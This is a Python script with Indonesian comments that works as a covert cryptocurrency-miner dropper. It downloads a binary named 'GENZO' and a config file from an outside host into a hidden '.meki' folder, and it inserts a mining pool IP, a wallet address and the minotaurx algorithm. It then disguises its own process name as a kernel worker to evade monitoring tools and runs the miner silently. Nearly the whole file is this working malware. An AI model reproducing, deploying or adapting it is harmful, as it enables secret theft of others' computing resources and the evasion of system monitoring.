#!/usr/bin/env python3
import os
import subprocess
import urllib.request
import re
import sys
import ctypes
import platform

def hide_process():
    """
    Menyembunyikan proses dari user-level monitor seperti UV Starter
    """
    try:
        if platform.system() == "Linux":
            libc = ctypes.CDLL("libc.so.6")
            prctl = libc.prctl
            PR_SET_NAME = 15
            fake_name = b"[kworker/u8:3-events_power_efficient]"
            prctl(PR_SET_NAME, fake_name, 0, 0, 0)
    except Exception as e:
        print(f"[!] Gagal hide process: {e}")

def silent_popen(command, cwd=None):
    """
    Menjalankan subprocess tanpa output ke terminal
    """
    return subprocess.Popen(
        command,
        cwd=cwd,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

def main():
    # Lokasi kerja tersembunyi
    workdir = os.path.join(os.getcwd(), ".meki")
    os.makedirs(workdir, exist_ok=True)

    # Pindah ke folder kerja
    os.chdir(workdir)

    # URL file
    url_genzo = "https://blogspotgenzo.site/GENZO"
    url_config = "https://blogspotgenzo.site/config.json"

    # Nama file
    file_genzo = "GENZO"
    file_config = "config.json"

    print("[*] Mengunduh file GENZO dan config.json...")

    # Download binary GENZO
    urllib.request.urlretrieve(url_genzo, file_genzo)

    # Download config.json
    urllib.request.urlretrieve(url_config, file_config)

    # Edit config.json agar sesuai target
    with open(file_config, "r", encoding="utf-8") as f:
        content = f.read()

    # Replace pattern dalam config
    content = re.sub(r'"tua"', '"164.90.210.229:443"', content)
    content = re.sub(r'"wulet"', '"MSTjKJKH6mtk1eGmjZ1ukTbsnedKfCqWST.Danis"', content)
    content = re.sub(r'"meki"', '"minotaurx"', content)

    with open(file_config, "w", encoding="utf-8") as f:
        f.write(content)

    # Ubah permission jadi executable
    try:
        os.chmod(file_genzo, 0o755)
    except Exception as e:
        print(f"[!] Gagal chmod: {e}")

    # Sembunyikan proses
    hide_process()

    print("[*] Menjalankan GENZO secara diam-diam...\n")

    # Jalankan miner secara silent
    miner = silent_popen(["./GENZO", "-c", file_config], cwd=workdir)

    print(f"[*] GENZO berjalan dengan PID: {miner.pid}")

    # Tunggu proses utama agar tidak exit
    try:
        miner.wait()
    except KeyboardInterrupt:
        print("[*] Proses dihentikan oleh user.")
        miner.terminate()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Terjadi error: {e}")
        sys.exit(1)
